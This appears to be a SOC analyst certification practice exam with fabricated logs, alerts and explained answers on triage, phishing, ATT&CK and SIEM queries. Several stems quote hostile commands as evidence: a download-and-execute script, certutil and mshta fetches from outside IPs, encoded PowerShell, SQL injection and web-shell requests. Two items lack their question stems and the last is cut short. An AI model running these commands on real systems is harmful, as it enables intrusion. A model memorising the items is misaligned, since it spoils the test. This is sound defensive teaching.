title: SAL1 practice exam (shorter than the real one)
note: Original questions and made-up scenarios written for MyNextCert from TryHackMe's public SAL1 topic list. Not real exam questions. Shorter than the real exam: real SAL1 is 80 multiple-choice questions plus 2 two-hour SOC Simulator scenarios; each attempt here draws 20 questions and 5 shorter scenarios. All data is fabricated. Practice only in legal labs (TryHackMe, your own machines) with written permission.

q.q:
A firewall log line reads:
2026-11-20 09:14:02 ALLOW tcp 192.0.2.50:49822 -> 10.0.4.12:3389
The destination is a Windows file server. Which service was the outside host connecting to?
o: SMB file sharing, used to read and write files on a Windows server
SMB uses port 445 (older NetBIOS uses 139). It does not use 3389.
VNC screen sharing, the usual remote desktop tool on Linux
VNC normally listens on 5900. Port 3389 is not the VNC port.
WinRM remote management
WinRM uses ports 5985 (HTTP) and 5986 (HTTPS), not 3389.
Remote Desktop (RDP), a graphical remote login to a Windows host
Right. Port 3389 is the Remote Desktop Protocol port. A connection to it from an outside address is worth a closer look.

q.q:
A packet capture on a web server shows this pattern, repeated for 400 different source ports from 198.51.100.7:
198.51.100.7 -> 10.0.4.20:443  [SYN]
10.0.4.20 -> 198.51.100.7  [SYN, ACK]
(no further packet from 198.51.100.7)
What does this pattern mean?
o: Normal HTTPS browsing, because TLS starts with a SYN
A normal browser sends the final ACK and then starts TLS. Hundreds of unfinished handshakes are not normal browsing.
The handshake is never completed
Right. The client sent SYN and the server answered SYN-ACK, but the final ACK never came. Many half-open attempts like this fit a SYN scan or SYN flood.
The server rejected the connection with a reset packet
A rejection would show an RST packet from the server. Here the server answered with SYN-ACK, which means it was willing to talk.
A completed session that the client closed early with FIN
A FIN only appears after a session was fully opened. No ACK was ever sent here, so no session existed.

q.q: An Ubuntu 22.04 web server is suspected of being targeted by password guessing over SSH. You have shell access and need the failed login attempts. Which file should you search first?
o: /var/log/dpkg.log, which logs package installs
dpkg.log only records package installs and removals. It has no login data.
/var/log/syslog, the general system messages file
On Ubuntu the default syslog file leaves out authentication messages. SSH login results go to auth.log.
/var/log/auth.log, which records logins and sudo use
Right. On Debian and Ubuntu systems, SSH successes and failures are written to auth.log (RHEL-style systems use /var/log/secure).
/etc/shadow, which holds password hashes
This file stores hashed passwords, not a history of attempts. It is also restricted to root.

q.q: You review four Windows process trees from different hosts. Which one is the odd one out and should be investigated?
o: explorer.exe -> svchost.exe -k netsvcs
Right. Real service-host processes are started by services.exe, not by the user's desktop (explorer.exe). A fake svchost started this way is a classic masquerade.
wininit.exe -> services.exe -> svchost.exe -k netsvcs
This is the normal chain. wininit starts services.exe, and services.exe starts each service host.
smss.exe -> csrss.exe
The session manager starting the client/server runtime process is a normal part of Windows startup.
services.exe -> svchost.exe -k LocalService
services.exe is the correct parent of svchost.exe. The -k name just picks which group of services runs.

q.q:
While reviewing a script found on a file share, you see this line:
cfg = 'c3ZjX2JhY2t1cDpTdW1tZXIyMDI1IQ=='
A teammate says the credentials are safe because they are encrypted. What is the correct response?
o: It is encrypted, but only with a weak key that attackers can crack with a tool
There is no key here. Base64 is a public encoding scheme, so there is nothing to crack.
It is a hash, so the password cannot be recovered
A hash is one-way and has a fixed length. This string decodes straight back to the original text.
It is Base64 encoding, not encryption; it decodes to svc_backup:Summer2025!
Right. Base64 only changes how data is written and needs no key. It hides nothing from a person who decodes it.
It is TLS-protected text, safe while stored on the share
TLS protects data while it moves across a network. This string is plain stored text and has no TLS protection.

q.q: A vendor publishes this SHA-256 for an installer: 9f2c...a41e. After download, you compute 7be0...c3d8, which looks completely different from the vendor's value. What can you conclude?
o: The files differ only slightly, since a tiny edit gives a similar hash
Hashes do not work that way. A one-bit change produces a totally different value, so size of difference tells you nothing.
The file is not byte-for-byte the one the vendor published
Right. Any change to the file, even one bit, gives a different hash. The cause may be corruption or tampering, but the file does not match.
The hash was computed with the wrong key, so it can be ignored
SHA-256 is not keyed. Two people hashing the same file always get the same value.
The installer is safe because the hash is unique
Unique does not mean safe. A different hash means the file is different from the one published, which is a warning.

q.q: An EDR alert shows a suspicious process running inside a container on node k8s-node-3. A colleague says a container problem can never touch the host. Which statement about containers is true?
o: Each container has its own full operating system kernel
That describes a virtual machine. Containers reuse the host kernel, which is why they start so fast.
A hypervisor always isolates each container
A hypervisor runs virtual machines. Containers are isolated by kernel features, not by a hypervisor.
Containers share the host's kernel, so a kernel-level escape can reach the host
Right. Because there is only one kernel, a flaw that lets code break out of a container can affect the host. That is why container alerts get attention.
Container processes are invisible to an EDR agent on the host
Container processes are ordinary host processes, so host-level EDR can usually see them.
A service account signed in interactively with no MFA
Right. Service accounts normally run jobs with keys, not interactive sign-ins. A console login with no MFA suggests stolen credentials.
The user type is IAMUser rather than a role, which is a sign of an attack
IAMUser is the standard identity type for named accounts and is not suspicious by itself.
The sourceIPAddress is a public address, which is always suspicious
Staff sign in from public addresses all the time. The address alone proves little.
The responseElements show Success, so the login was legitimate
Success only means the password worked. A stolen password also succeeds.

q.q:
A web server log shows:
198.51.100.9 - - [20/Nov/2026:10:02:11] "GET /admin/export.csv HTTP/1.1" 401 312
198.51.100.9 - - [20/Nov/2026:10:02:14] "GET /admin/export.csv HTTP/1.1" 200 88412
What do the two status codes tell you?
o: 401 demanded credentials, then the same request returned 200 with about 88 KB
Right. 401 means credentials are required. The 200 that follows means the request was accepted, so check how the client got access.
Both failed, because 4xx and 2xx codes are both treated as errors by web servers
Only 4xx and 5xx codes are errors. A 200 means success.
A redirect to a login page, then a successful sign-in that returned the file
Redirects use 3xx codes such as 302. Neither line is one.
The 401 means the server blocked the file, so the 200 was a cached copy
401 means credentials are needed, not blocked, and a 200 with 88 KB is a fresh answer, not a cache marker.

q.q:
You find this Python script on a workstation:
import subprocess, os
subprocess.run(["curl","-o","/tmp/.x","http://203.0.113.9/p"])
os.chmod("/tmp/.x",0o755)
subprocess.run(["/tmp/.x"])
What does the script do?
o: Downloads a file and runs it only if its hash matches
The script never checks a hash. It runs whatever it downloaded.
Downloads a file, hides it and schedules it to run at the next reboot
The dot in the file name hides it a little, but nothing schedules it. The last line starts it immediately.
Downloads a file and runs it inside a restricted sandbox
Nothing here sandboxes the file. It runs directly with the user's own rights.
Downloads a file, makes it executable and runs it
Right. curl saves the file, chmod 755 sets the execute permission, and the last line runs it. This is a download-and-execute pattern.
Integrity, because data was changed without authority
Right. Integrity means data stays accurate and only authorised changes happen. The attacker altered trusted values.
Confidentiality, because a stolen account was used
Confidentiality is about keeping data from people who should not read it. Nothing was read or copied here.
Availability, because payroll is now less useful
Availability means the system can be reached and used. The database stayed online, so it was not hit.
Non-repudiation, since the UPDATE was logged
Non-repudiation is not part of the CIA triad, and good logging does not fix the changed data.

q.q: A help desk technician only needs to reset user passwords, but the account is a member of Domain Admins. Which change best applies least privilege?
o: Keep the Domain Admins membership but require a much longer password and MFA
A stronger sign-in makes theft harder, but it does not reduce what the account can do if it is stolen.
Rename the account so attackers cannot find it
Hiding a name is not access control. The powerful rights remain and tools can still list the account.
Add a second Domain Admin account for backup
More powerful accounts means more risk, which is the opposite of least privilege.
Delegate password reset on the user OU and remove Domain Admins membership
Right. Least privilege gives only the access a job needs. Delegation covers the task without full domain control.

q.q:
A Windows process log shows:
schtasks /create /tn "Updater" /tr C:\Users\Public\u.exe /sc onlogon
The task runs at every logon, so it survives reboots. Which ATT&CK tactic (the attacker's goal) best fits this command?
o: Persistence
Right. A task that runs at every logon keeps the attacker's program coming back after a reboot or logoff.
Execution
Execution is about running code, and the task does run a program. But the /sc onlogon trigger shows the aim is to survive reboots, which is Persistence.
Exfiltration
Exfiltration is about moving data out of the network. This command sets up a program, not a data transfer.
Defense Evasion
Defense Evasion is about hiding from defenders, such as turning off logging. A startup task is about staying on the host, not hiding.

q.q: An alert is tagged T1059.001. What does the tag tell you?
o: The tactic Execution (TA0002), which covers running PowerShell
Execution is the tactic (the goal) and has a TA ID. T1059.001 is a sub-technique that sits under it.
Technique Command and Scripting Interpreter, PowerShell sub-technique
Right. T1059 is the technique and .001 is the sub-technique PowerShell. It says how the attacker acted.
A CVE number assigned to a security flaw in the PowerShell program itself
CVEs are written CVE-year-number. ATT&CK IDs describe behaviour, not specific software flaws.
A threat group that uses PowerShell
Groups use IDs starting with G. T-numbers describe techniques, not who is using them.

q.q:
A mail gateway log shows:
ACCEPT from=billing@vendor-pay.test to=jlee@agency.example attach=invoice_1129.docm size=84211
Which Cyber Kill Chain phase does this event show?
o: Weaponization, building the malicious file
Weaponization is when the attacker builds the malicious file, which happens out of sight before sending.
Exploitation, the code running on the host
Exploitation begins when the victim opens the file and its code runs. This log only shows the message arriving.
Installation, the malware setting itself up
Installation is when malware sets itself up on the host. Nothing has run yet in this log.
Delivery, when the weapon reaches the target by email
Right. Delivery is when the attacker's weapon reaches the target, here by email attachment.

q.q: EDR shows a new process on a workstation contacting rare-domain.test every 60 seconds with a tiny POST. Which Kill Chain phase is this, and what usually comes next?
o: Installation; next is command and control, once the new malware phones home
Installation is when malware sets itself up. The steady beacon already shows it is phoning home, so it is past that.
Delivery; next is exploitation once the user opens the file
Delivery is the arrival of the weapon. The process is already running and calling out.
Exploitation; next is installing a persistence tool
Exploitation is when the code first runs. A steady check-in shows a working channel, which is command and control.
Command and control; next is actions on objectives, such as stealing data
Right. Regular check-ins mean the attacker has a channel into the host. After that they act on their goals.

q.q: A manager asks which function NIST CSF 2.0 added that covers risk strategy, roles, policy and oversight across the whole organization, not just security operations. What is the answer?
o: Detect, which finds anomalies
Detect existed in version 1.1. It covers finding events such as anomalies and monitoring.
Govern, which sets risk strategy and oversight
Right. CSF 2.0 added Govern as the function that sets and watches cybersecurity risk decisions across the group.
Protect, which covers safeguards like access control and training
Protect is an original function about safeguards like access control and training.
Identify, which covers assets, risks and business context
Identify was in version 1.1. It covers knowing your assets, risks and business context.

q.q: After a ransomware attack, the team rebuilds servers from clean backups and checks that services work. Which CSF function does this belong to?
o: Respond, which contains active incidents
Respond covers containing and analysing the incident while it is active. Rebuilding after the fact is recovery.
Identify, which lists which servers matter most
Identify covers knowing your assets and risks. The rebuild itself is not an asset-list task.
Protect, which puts safeguards in place
Protect is about safeguards put in place before an incident. Restoring from backup is not a safeguard step.
Recover, which restores normal operations
Right. Recover is about restoring services and normal operation after an incident.

q.q: You can deploy one new detection rule. According to the Pyramid of Pain, which rule will force the attacker to change the most to stay undetected?
o: Block the SHA-256 of last week's malware sample and its three known variants
A hash is at the bottom of the pyramid. Changing one byte gives a new hash.
Block the attacker's last known IP address
IP addresses are easy to change by moving to another server.
Alert when an Office app starts PowerShell with an encoded command
Right. This detects a behaviour (a TTP), the top of the pyramid. The attacker must change how they work, not just a value.
Block a single domain used in last week's email
Domains are a little harder than IPs but a new one is cheap and quick to register.

q.q: A threat feed lists the SHA-256 hash of a file the malware drops on disk, and your tool also uses SHA-256. Your hunt finds no host with that hash, yet the same malware may still be present. What is the best explanation?
o: The feed lists the SHA-1 of the file but your tool reports SHA-256
The stem says both use SHA-256, so a mismatch of hash types is not the cause.
The sample is fileless malware that only ever runs in memory
This sample is a file on disk with a hash in the feed, so it is not fileless.
The hash expires after seven days, so old entries fail
Hashes do not expire. The same file always has the same hash.
Attackers can repack the file, changing its hash
Right. Hash matching only finds exact copies. Behaviour-based detection catches variants that hashes miss.

q.q:
A reported email has these headers:
From: "IT Help" <helpdesk@agency.example>
Reply-To: <reset@mailbox-help.test>
Authentication-Results: spf=pass smtp.mailfrom=bulkmail.test; dkim=none; dmarc=fail header.from=agency.example
Which detail is the strongest evidence that the From address is forged?
o: SPF passed, so the sender was verified
SPF passed for bulkmail.test, a different domain than the one in From. A pass for another domain proves nothing about helpdesk@agency.example.
DKIM shows none, which proves forgery
No DKIM signature is common on legitimate mail too. It is a weak hint, not proof.
DMARC failed: the SPF pass is for bulkmail.test, not the agency.example From domain
Right. DMARC needs the checked domain to line up with the visible From domain. It does not, so the From address was not authorised.
The Reply-To address differs from From, which on its own proves the mail was spoofed
A different Reply-To is suspicious but also used by real mail tools. The authentication result is stronger evidence.

q.q:
A phishing email links to:
https://login.agency.example.session-check.test/auth
Which domain actually controls this page?
o: agency.example
That name only appears as a subdomain label to look familiar. The attacker controls the page simply because they own session-check.test.
login.agency.example
This is a made-up subdomain on session-check.test. It is not a separate website.
example
That is only the ending of a decoy label inside the address. It does not say who owns the site.
session-check.test
Right. Read a web address from the right: the registered domain is the part just before the final ending. Everything before it is a subdomain the owner chose.

q.q: A user reports a phishing email and says they typed their password on the linked page before noticing. Proxy logs confirm the visit to the fake login page. What should you do first?
o: Reset the password, revoke active sessions, then look for other recipients
Right. The password is exposed now, so you cut off access first. Then you find others who may be affected.
Delete the email from the user's inbox and close the ticket as resolved
Deleting the message does not undo the exposed password. The attacker can still sign in.
Wait and watch for suspicious logins from that account before changing anything
Waiting gives the attacker time to use the account. Act as soon as exposure is confirmed.
Block the sender address on the mail gateway and tell the user to be careful
Blocking one address does not protect the already stolen password. Attackers also change senders easily.

q.q:
Windows Security log summary for one source over 10 minutes:
EventID 4625 src=198.51.100.23 distinct_users=312 attempts_per_user=1-2 passwords_tried=Spring2026!,Welcome1 (the same two for every user)
Which attack does this match?
o: Brute force, where one account is hit with a very long list of guesses
Brute force hammers a single account with many guesses. Here each account is tried only once or twice.
Credential stuffing with a leaked list of user and password pairs
Stuffing replays a different leaked password for each account. Here the same two passwords appear for every user.
Password spraying, trying few passwords across many accounts
Right. Two common passwords tried against hundreds of accounts, once or twice each, avoids lockouts. That is the spraying pattern.
A normal outage where many users mistype their passwords at once
Hundreds of distinct accounts from a single outside address with identical passwords are not ordinary typos.

q.q:
Network monitoring on a LAN shows these ARP replies (10.0.0.77 is a user workstation):
10.0.0.1 is-at 00:50:ab:cd:00:01 (gateway, earlier)
10.0.0.77 is-at 00:50:ab:cd:00:99
10.0.0.1 is-at 00:50:ab:cd:00:99
What is the most likely issue?
o: A DHCP server handing out the same address lease to two different machines at once
DHCP conflicts show duplicate IP addresses, not one MAC address answering for two IPs.
A normal router failover
Failover would move the gateway to a new device by agreement, not a regular user host (.77) claiming it.
ARP spoofing: host 10.0.0.77 claims the gateway address to sit in the middle
Right. Two IP addresses sharing one MAC, one being the gateway, means the host is pretending to be the gateway (a man-in-the-middle position).
A DNS cache poisoning attack
DNS poisoning changes name lookups. This evidence is address-to-MAC mappings on the local network.

q.q:
Web server access log:
198.51.100.31 "GET /products?id=5' UNION SELECT username,password FROM users-- HTTP/1.1" 200 9140
A normal /products?id=5 response is about 1.2 KB. What is the best reading?
o: Cross-site scripting, because the request contains a quote mark in the parameter and the reply was large
XSS uses script tags or event handlers. This request has SQL keywords, not script.
A failed injection, because the page still came back with a normal 200 status
A 200 status does not show failure. The reply is much larger than normal, which hints that data came out.
SQL injection that probably worked: the reply is far larger than normal
Right. UNION SELECT is a SQL injection pattern. A 200 reply almost eight times the usual size suggests extra data came back, so escalate.
Path traversal, because the request string contains dashes and the page returned so many bytes
Path traversal uses ../ sequences to leave the web folder. Dashes here are a SQL comment.

q.q:
Access log excerpt:
10:01:07 POST /upload.php 200 (file: avatar.php.jpg)
10:03:40 GET /uploads/avatar.php.jpg?c=id 200
10:03:55 GET /uploads/avatar.php.jpg?c=cat+/etc/passwd 200
What is the best explanation?
o: A web shell was uploaded through the upload form and is being used to run commands
Right. A script disguised as an image runs commands passed in the c parameter. The upload feature accepted a file it should not have.
A path traversal attempt against the upload form, reading system files
Path traversal uses ../ sequences to leave a folder. These requests have none and pass commands instead.
An image preview feature resizing the uploaded file
A preview tool does not run id or read /etc/passwd. Those are operating system commands.
A directory listing from a misconfigured server
A listing would show file names. These requests run system commands.

q.q:
EDR shows this process tree on a finance workstation. The Word document arrived by outside email five minutes earlier:
winword.exe
  cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgA...
What does this most likely indicate?
o: A Word add-in that checks for template updates
Add-ins do not start cmd.exe with an encoded PowerShell command, and nothing here is about templates.
A malicious macro launching hidden PowerShell
Right. Office apps rarely start cmd and PowerShell. Hidden window plus encoded command, from a document that just arrived by outside email, is typical of a macro downloader.
A finance mail-merge macro that calls PowerShell to refresh figures
Real macros rarely hide the window and pass an encoded command, and this document came from outside email minutes ago.
An admin running a script through the Word application
Admins run scripts from their own shell or tools, not from inside a document application.

q.q:
Sysmon event 10 (process access):
SourceImage: C:\Users\Public\x.exe
TargetImage: C:\Windows\System32\lsass.exe
GrantedAccess: 0x1410
Which behaviour does this represent?
o: Persistence through a Run key
Run keys are registry entries. This event is one process reading another's memory.
Credential dumping, reading LSASS memory for passwords or hashes
Right. LSASS holds credentials in memory. An unknown program in a public folder reading it is a standard credential theft sign.
A normal antivirus scan
Security products live in their own protected folders. A program in C:\Users\Public is not one.
Process hollowing, where code inside lsass.exe is replaced by the attacker's own
Hollowing replaces a process's code. This event only shows read-type access rights, not code replacement.

q.q:
Proxy log excerpt:
10:00:03 POST https://updates.cdn-sync.test/api 200 bytes=212
10:01:06 POST https://updates.cdn-sync.test/api 200 bytes=208
10:01:58 POST https://updates.cdn-sync.test/api 200 bytes=215
10:03:04 POST https://updates.cdn-sync.test/api 200 bytes=210
What does this suggest?
o: A person browsing a news site, with pauses between page loads
Browsing loads many files of different sizes at uneven times, not one tiny POST to one API.
Beaconing with jitter: automated check-ins of similar size
Right. Gaps near 60 seconds with small random variation and near-identical sizes look like a beacon with jitter. People do not click on a clock.
A scheduled Windows update downloading patches from a vendor server
Updates download large files and use known Microsoft hosts, not a tiny repeated POST to an unknown domain.
Time synchronisation between two hosts through a small web service API
Time sync uses NTP on UDP 123, not HTTPS POSTs to a web API.

q.q:
DNS logs show 800 queries in one hour from one host:
aGVsbG8gd29ybGQK0x1.t.exfil-dns.test TXT
ZmFrZWRhdGE5Mw0x7.t.exfil-dns.test TXT
...all under one rare parent domain. What is the likely activity?
o: A cloud storage service that uses long generated host names
Those names are long too, but they resolve with A or CNAME records and many clients use them. This is TXT traffic to one rare parent.
Ordinary CDN lookups made while loading web pages
CDN names are short, readable and use A or AAAA records.
DNS tunneling, hiding data in long random-looking subdomains
Right. Long encoded labels, TXT queries and one rare parent domain match data being smuggled through DNS.
A mail gateway doing DKIM lookups for many sender domains
DKIM lookups are TXT queries, but they go to many well-known sender domains, not hundreds of random labels under one rare parent.

q.q: Within eight minutes the same file appears on 14 servers. Each copy was written to the ADMIN$ share by the previous server, and no user or operator session was seen. Which malware type fits best?
o: A virus that attaches to a document the user opens and spreads that way
Viruses need a user or program to run the infected file. No one opened anything here.
A worm, which copies itself from server to server without help
Right. Self-copying from host to host with no user action is what a worm does.
A trojan disguised as useful software
Trojans rely on a person installing them. This spread without any person.
A remote access trojan that the attacker pushes to each server by hand
Each copy came from the previous server, not from the attacker, so it spread by itself.

q.q:
EDR records on a workstation:
certutil.exe -urlcache -split -f http://203.0.113.40/a.txt C:\Users\Public\a.exe
What is happening?
o: A certificate being installed into the trusted store
Installing a certificate would use -addstore. This command pulls a file from a URL.
A signed Windows tool is downloading a file
Right. certutil is a signed Microsoft tool for certificates, but -urlcache -f fetches files. Attackers use it because it is already trusted.
A normal Windows update fetching a patch for the OS
Updates come from Microsoft services and are not saved as .exe in a Public folder.
Antivirus signing a file with a new certificate
Antivirus does not use certutil to download a file from an outside IP.

q.q:
A command line on a server reads:
powershell.exe -nop -w hidden -enc SQBFAFgAIAAo...
Which statement about it is correct?
o: -nop skips profiles, -w hidden hides the window, -enc runs Base64
Right. Each switch helps the attacker stay quiet or avoid scrutiny. Decode the string to see what it runs.
-nop skips profiles, -w hidden turns off script logging, -enc runs Base64
-w hidden only hides the window. Script and process logging still record what ran.
-nop skips profiles, -w hidden hides the window, -enc decrypts a protected script
-enc is Base64 encoding, not decryption. No key or protection is involved.
-nop blocks network access, -w hidden hides the window, -enc runs Base64
-nop means no profile scripts. It has nothing to do with the network.

q.q:
EDR shows on workstation WS-114:
excel.exe (user maria) -> cmd.exe -> powershell.exe -> connection to 203.0.113.55:8443 (established)
The user is still logged on. What is the best first containment step?
o: Run a full antivirus scan on the host and wait for the result before acting
The attacker keeps a live connection for the whole scan. Contain first.
Block 203.0.113.55 at the firewall and leave the workstation connected
Blocking one address helps, but the attacker can switch to another. Host isolation is the stronger first step.
Isolate the host from the network with the EDR and leave it powered on
Right. Isolation cuts off the attacker's channel while the EDR link stays up and memory is preserved for the investigation.
Ask maria to log off and shut the laptop down so the connection drops
Shutting down loses memory evidence, and relying on the user is slow and unreliable.

q.q:
An EDR alert shows:
Image: C:\Windows\System32\mshta.exe  Parent: outlook.exe  User: jdoe  CommandLine: mshta.exe http://203.0.113.45/a.hta
Which single detail makes this alert most suspicious?
o: The file is mshta.exe, a built-in Microsoft tool and a signed program
Many safe programs are built in and signed. Attackers abuse such tools on purpose, so the file name alone is not the clue.
The command line contains an IP address, written instead of a name
A bare IP is a clue, but it is weaker and less specific: some legitimate tools use IPs. The odd parent and tool pair says more.
The alert is for jdoe, who is a standard user and not an admin
Standard accounts are normal for staff. The account type is not what makes this suspicious.
Outlook, a mail client, started mshta.exe, which runs remote scripts
Right. Mail clients have no reason to start mshta, a built-in tool that runs remote scripts. That parent and tool pair is a classic phishing chain.

q.q:
A Snort rule reads:
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH burst"; flags:S; detection_filter:track by_src, count 10, seconds 60; sid:1000001;)
When does it fire?
o: One outside address sends more than 10 SYNs (new connection attempts) to port 22 within 60 seconds
Right. The first 10 matching SYNs from a source in a 60-second window do not alert. Alerts start once the count is exceeded.
Any single SSH login from an outside address, because the rule alerts on every match
The rule alerts only after the rate is exceeded, not on every match.
An inside host sends 10 or more SYNs to outside SSH servers within a minute
The rule direction is from $EXTERNAL_NET to $HOME_NET. Outbound is not matched.
Ten different outside sources each send one SYN to port 22 within one minute
track by_src counts per source address, not across different sources.

q.q: A network sensor on a SPAN (mirror) port raised an alert: "EXPLOIT attempt against web server". The exploit traffic still reached the server. Why?
o: The IPS rule was set to alert only and passed the traffic
That can happen with an inline IPS, but this sensor sits on a mirror port and is not in the traffic path at all.
The sensor was inline but failed open during a restart
Fail-open happens to inline devices. This sensor is on a SPAN port, so it was never in the path.
The attack used an encrypted channel the firewall allows
Nothing in the alert says the traffic was encrypted. The alert itself shows the sensor could read it.
The sensor is a passive IDS that sees a copy of traffic and can only alert
Right. A mirror port gives a copy. To drop packets the device must be inline as an IPS.

q.q: In Splunk, you want failed Windows logons (EventCode 4625) counted for each account name, highest first. Which search does that?
o: index=win EventCode=4625 | top limit=5 src_ip | sort - count
top src_ip ranks source addresses, not account names.
index=win EventCode=4624 | stats count by user | sort - count
4624 is a successful logon, so this ranks accounts by successes.
index=win EventCode=4625 | stats dc(user)
dc gives one number, the count of different accounts, not a count for each account.
index=win EventCode=4625 | stats count by user | sort - count
Right. stats count by user counts failed logons per account, and sort puts the highest first.

q.q:
A KQL query in Sentinel reads:
SecurityEvent
| where EventID == 4688
| where NewProcessName endswith "powershell.exe" and CommandLine contains "-enc"
| project TimeGenerated, Computer, Account, CommandLine
It is meant to find encoded PowerShell commands. What is a weakness of this query?
o: It misses encoded commands written with the shorter switches -e or -ec
Right. PowerShell accepts shortened switch names, and -e or -ec do not contain the text -enc, so those commands slip past the filter.
It cannot show which account ran the command, because Account is left out of the output list
Account is in the project list, so it is shown.
The EventID filter should be 4624, not 4688, to see programs starting
4624 is a successful logon. Process creation is 4688, which is what the query needs.
It matches only powershell.exe run from System32 and misses copies in other folders
endswith on the file name matches the program from any folder.

q.q: A phishing SOAR playbook enriches the URL, auto-deletes mail scoring over 80 from all mailboxes, and opens a ticket otherwise. Which action should still need human approval?
o: Tagging the alert with the matching MITRE technique
Tagging changes nothing in the environment and is safe to automate.
Adding the ticket number to a medium-confidence alert record
Bookkeeping is a perfect job for automation.
Deleting a message with a score of 98 from every company mailbox
The playbook already deletes anything scoring over 80 on its own, and 98 is well above that.
Disabling an executive's account after a medium-confidence alert
Right. Actions with high business impact and uncertain evidence should have a person check first.

q.q: In a SOAR playbook, which step is an enrichment step rather than a response action?
o: Quarantine the message in every mailbox that received it
Quarantine changes the environment, so it is a response action.
Reset the password of every user who clicked the link in the email
A reset is a response that changes an account.
Pull domain age and reputation into the ticket
Right. Enrichment adds context so a person or later step can decide. It changes nothing in the environment.
Add the sender's IP address to the perimeter firewall blocklist
A blocklist entry changes the network, which is a response.

q.q: An IP lookup for 203.0.113.60 shows 0 abuse reports, 0% confidence, and the hosting provider "Example Cloud". The same IP was first seen in your logs today, beaconing. What is the best conclusion?
o: The IP is safe, so close the alert
Missing reports means unknown, not safe.
The lookup is wrong and should be ignored
The tool is not wrong. It just does not contain information about this address.
No reports does not clear it; new infrastructure may simply not be reported yet
Right. Threat intel only knows what others have seen. Your own logs showing beaconing carry more weight.
The provider is trusted, so hosts there are safe
Cloud providers rent addresses to anyone, including attackers.

q.q: A hash lookup shows 3 of 72 engines flag the file, all with generic names like "Heur.Suspicious". The file is unsigned and runs from a user's Downloads folder. How should you treat it?
o: Likely clean: 69 of 72 engines found nothing, so close it unless the host shows more alerts
A new or targeted file is often missed by most engines, so most saying clean is not proof.
Likely malicious: it is unsigned and in Downloads, so quarantine it and close as confirmed malware
Unsigned and in Downloads are clues, and three generic detections do not confirm anything.
Block the hash across the estate first and review the behaviour afterwards
Blocking on thin evidence could break a legitimate tool. Check what it does first.
Inconclusive: check the process behaviour and detonate it in a sandbox first
Right. Low generic detections prove nothing alone. Behaviour and context give the real answer.

q.q: An IDS raised many alerts at Sunday 02:00 from 10.9.9.5 scanning every subnet on ports 1-1000. Your records show 10.9.9.5 is the vulnerability scanner and scans run Sundays at 02:00. What is the best classification?
o: A hostile port scan from inside the network, so escalate it as critical and isolate the host
Evidence shows this is an approved tool at the approved time.
Expected, authorized scanner activity: IP and time match the schedule, so close it as benign with notes
Right. The scan is real, but it is approved. This is a benign true positive: write down the check you made and close it.
Suspicious, but only low priority: leave it for the next shift to review
The IP and time match an approved scan, so it is not suspicious. Parking it adds work for no reason.
Expected, but still escalate because the scan hit port 22 on a domain controller
Approved scans cover every host, domain controllers included. A matching source and window needs no escalation.

q.q: Two findings: (A) CVSS 9.8 on a lab host in an isolated segment reachable only from the admin VLAN, with no known exploit; (B) CVSS 7.5 on the internet-facing web server, where the exploit is public and your IDS has already logged attempts. Which should be patched first?
o: A, because it has the higher CVSS score
CVSS does not know where the host is or whether attackers use the bug.
Neither, because scanner scores are often overstated
Scanner findings can have false positives, but a known exploited flaw on a public server needs action.
B, because it is reachable from the internet and exploits are being used
Right. Scores are a starting point. A reachable system with exploits already used in the wild is more urgent.
A and B equally, because both are high severity
Both matter, but the order is set by who can reach them and active use.

q.q: A new colleague asks what a Tier 1 (L1) analyst mainly owns. Which answer is best?
o: Writing and tuning detection rules for the whole SOC
Rule writing and tuning is usually done by L2 or detection engineers.
Working the alert queue: triage, document, then close or escalate
Right. L1 is the first look at the alert queue. Deeper work goes to higher tiers.
Leading memory forensics on a confirmed breach
Memory forensics is normally L2 or L3 work.
Hunting across the network for hidden attackers with no alert
Proactive hunting is usually L2 or L3 work, with L1 only supporting.

q.q: A detection rule owned by the detection engineering team fires 400 times a day and nearly all are the same harmless backup job. What should L1 do?
o: Document it and ask for rule tuning
Right. L1 raises the evidence and the request. Rule changes need review so real attacks are not hidden.
Add a SIEM suppression for the backup server's address under their own login
A suppression is a rule change. It needs review so real attacks from that server are not hidden.
Close the alerts as false positives and mention the pattern at the next team meeting
A spoken mention is easily lost. The request has to be written in the ticket so rule owners act.
Close each alert with the standard note 'backup job' and leave the rule as it is
Without a tuning request the noise continues every day.

q.q: A confirmed intrusion needs a full disk image, memory analysis and malware reverse engineering, which most shifts never do. Which role normally leads that?
o: The L1 analyst who first saw the alert and has the case notes already
L1 triages and escalates. They do not usually run deep forensics.
The L2 analyst on shift, who handles routine escalations
L2 does deeper alert investigation, but full malware reverse engineering is normally L3 or response specialists.
The SOC manager
Managers coordinate people and report upward. Hands-on reverse engineering is not their normal task.
L3 or the incident response team, who hold deep forensic skills
Right. Deep forensics and reverse engineering are advanced skills held by senior analysts and responders.

q.q: Which statement best separates threat hunting from alert triage?
o: Hunting only reviews alerts that the SIEM has already raised and sorted by severity
That describes triage.
Hunting starts from an idea about attacker behaviour, even with no alert
Right. A hunt begins with a hypothesis. Triage begins with an alert that already exists.
Hunting is the job of the product vendor rather than of the SOC team members
SOCs hunt too, and L1 may support by running saved searches.
Hunting is only done after an incident is declared
Hunts look for attackers nobody has found yet, so they happen before any incident is declared.

q.q: Staff reported an email with a link. What is the safest way to check the link?
o: Open it in a private browser window on a locked-down workstation
A private window only skips saved history. The page still loads and runs on your own computer.
Check the domain's WHOIS age alone and clear it if it is older than a year
Age is one clue. Attackers also use hacked older sites, so age alone cannot clear a link.
Have the reporting user open it again and describe what the page shows
That exposes the user a second time and the description cannot show hidden redirects or downloads.
Submit the URL to a sandbox or URL scanner, not your work browser
Right. A scanner opens it away from your network and reports what it sees.

q.q: The SIEM dashboard shows zero events from the main firewall for the last two hours. Other sources look normal. What is the best action?
o: Restart the SIEM indexer first and open a ticket only if that fails
Other sources are fine, so the indexer is unlikely to be the cause, and the delay leaves a blind spot.
Check whether other firewalls also stopped before doing anything
Comparing is useful, but it comes with the ticket. Waiting to report leaves a blind spot.
Open a ticket: silence from a log source may mean a failed forwarder or tampering
Right. Missing logs are a monitoring problem to chase, because they can hide an attack.
Wait for the next scheduled log-source health report in the morning
A two-hour gap is a blind spot during which anything could happen.

q.q: An impossible-travel alert: user jlee signed in from the office at 09:02, then from 203.0.113.80 abroad at 09:20 with MFA approved. What is the best next step?
o: Close it as a false positive because the MFA prompt was approved on the second sign-in by the user
Attackers can steal sessions or trick users into approving MFA prompts.
Disable the user account at once without checking anything else about the sign-ins
It may cause an outage when a VPN or travel explains it. Look at evidence first.
